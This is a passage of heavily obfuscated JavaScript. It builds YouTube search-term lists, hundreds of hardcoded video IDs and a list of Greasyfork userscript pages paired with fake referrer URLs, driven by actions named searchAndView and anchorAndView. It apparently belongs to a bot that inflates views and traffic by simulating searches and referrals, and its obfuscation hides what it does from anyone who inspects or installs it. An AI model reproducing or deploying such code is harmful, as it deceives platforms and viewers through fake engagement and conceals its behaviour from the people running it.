'\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1b * 0x137 + -0x1c45 * -0x1 + 0x492)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1a20 + -0x1e24 * -0x1 + -0x3fa)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + Y(0xb, '@V[d') + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xe * 0x233 + -0x3 * -0xcb5 + -0x752);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * -0x24dd + -0x1 * -0x1d5d + -0x423a);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    Z(0x6) + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    Z(0x1) + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    Z(0x2) + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + Z(0x18) + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x11) + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + Z(0x10) + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Z(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': Z(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + Z(0x18) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
